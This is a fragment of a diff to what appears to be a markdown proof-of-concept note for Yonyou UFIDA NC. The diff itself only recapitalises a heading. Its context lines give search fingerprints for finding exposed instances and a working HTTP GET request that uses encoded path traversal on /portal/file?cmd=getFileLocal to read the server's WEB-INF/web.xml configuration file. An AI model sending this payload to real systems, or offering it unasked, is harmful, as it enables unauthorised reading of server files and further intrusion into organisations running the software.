@@ -10,7 +10,7 @@ app="用友-移动系统管理"
 app:"用友 UFIDA NC"
 ```
 
-## poc
+## POC
 ```
 GET /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml HTTP/1.1
 Host: {}
